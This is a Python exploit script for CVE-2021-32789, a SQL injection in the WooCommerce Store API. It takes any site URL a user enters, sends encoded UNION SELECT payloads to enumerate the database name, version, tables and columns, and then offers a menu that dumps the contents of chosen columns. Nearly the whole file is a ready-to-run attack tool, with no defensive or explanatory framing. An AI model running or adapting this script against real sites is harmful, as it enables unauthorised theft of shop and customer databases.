#!/usr/bin/python3
import requests

creator_email = "donvorrin@gmail.com"
creator_github = "https://github.com/DonVorrin"
print('-' * 60)
print('CVE-2021-32789 by Vorrin')
print(f'Creator info:\n\tmail | {creator_email}\n\tgithub | {creator_github}')
print('-' * 60)
payload = {
    'database': '%252522%252529%252520union%252520all%252520select%2525201%25252Cdatabase%252528%252529%25253B%252500',
    'version': '%252522%252529%252520union%252520all%252520select%2525201%25252Cversion%252528%252529%25253B%252500',
    'tables': '%252522%252529%252520union%252520all%252520select%2525201%25252Ctable%25255fname%252520from'
              '%252520information%25255fschema%25252etables%25253B%252500',
    'tables_columns': '%252522%252529%252520UNION%252520SELECT%2525201%25252C%252520concat%252528table%25255fname'
                      '%25252C0x3a%25252Ccolumn%25255fname%252529%252520FROM%252520information%25255fschema'
                      '%25252ecolumns%25253B%252500'
}

url_path = "/wp-json/wc/store/products/collection-data?calculate_attribute_counts[][taxonomy]="

print('Example url:\n\tEnter web-site: http://website.com/\n')
user_url = input('Enter web-site: ')
user_url += url_path
print('-' * 60)
print('Start exploit. Please wait.')
dict_result = {}
for i, enum in enumerate(payload):
    if enum == 'database' or enum == 'version':
        response = requests.get(f'{user_url}{payload[enum]}')
        print(f'({i + 1}/{len(payload)}) Output {enum}: {(response.json())['attribute_counts'][1]['term']}')
    elif enum == 'tables':
        response = requests.get(f'{user_url}{payload[enum]}')
        print(f'({i + 1}/{len(payload)}) Collecting database tables: DONE')
        for i_1, enum_1 in enumerate((response.json())['attribute_counts']):
            if i_1 == 0:
                continue
            result = (response.json())['attribute_counts'][i_1]['term']
            result_1 = list(item.split(":") for item in result.split(";"))
            dict_result[result_1[0][0]] = []
    elif enum == 'tables_columns':
        response = requests.get(f'{user_url}{payload[enum]}')
        print(f'({i + 1}/{len(payload)}) Collecting table columns: DONE')
        for i_1, enum_1 in enumerate((response.json())['attribute_counts']):
            if i_1 == 0:
                continue
            result = (response.json())['attribute_counts'][i_1]['term']
            result_1 = list(item.split(":") for item in result.split(";"))
            dict_result[result_1[0][0]].append(result_1[0][1])


def user_menu(dict_results, u_url):
    print('-' * 60)
    print('1 | Output all columns\n2 | Output table and columns\n3 | Output text columns')
    user_numb = int(input('Enter number: '))
    if user_numb == 1:
        print('Output columns:')
        print('-' * 60)
        for i_j, enum_j in enumerate(dict_results.keys()):
            print(f'\t{i_j + 1} | {enum_j}')
    elif user_numb == 2:
        print('Output table columns:')
        print('-' * 60)
        for i_j, enum_j in enumerate(dict_results.keys()):
            print(f'{i_j + 1} | {enum_j}')
            print(f'\t\t{dict_results[enum_j]}')

    elif user_numb == 3:
        sql_inj = '") UNION SELECT 1, concat(<COLUMN_1>,0x3a,<COLUMN_2>) FROM <TABLE>;ï¿½'
        sql_inj_url = (
            f'{u_url}%252522%252529%252520UNION%252520SELECT%2525201%25252Cconcat%252528<COLUMN_1>%25252C0x3a%25252C'
            f'<COLUMN_2>%252529%252520FROM%252520<TABLE>%25253B%252500')
        print('------FOR BROWSER URL------')
        print(f'SQL inj: {sql_inj}')
        print(f'payload: {sql_inj_url}\nEdit plase <COLUMN_1>, <COLUMN_2>, <TABLE>')
        print('---------------------------')
        select_user = int(input('Select number for output: ')) - 1
        list_table = list(dict_results)[select_user]
        list_columns = dict_results[list(dict_results.keys())[select_user]]

        print(f'Table: {list_table}')
        for i_j, column in enumerate(list_columns):
            payload_text = (f'%252522%252529%252520union%252520all%252520select%2525201%25252C{column}%252520'
                            f'from%252520{list_table}%25253B%252500')
            print(f'\t{i_j + 1} | {column}')
            response_j = requests.get(f'{u_url}{payload_text}')
            print(f'\t\tText: {(response_j.json())['attribute_counts'][1]['term']}')


while True:
    user_menu(dict_result, user_url)
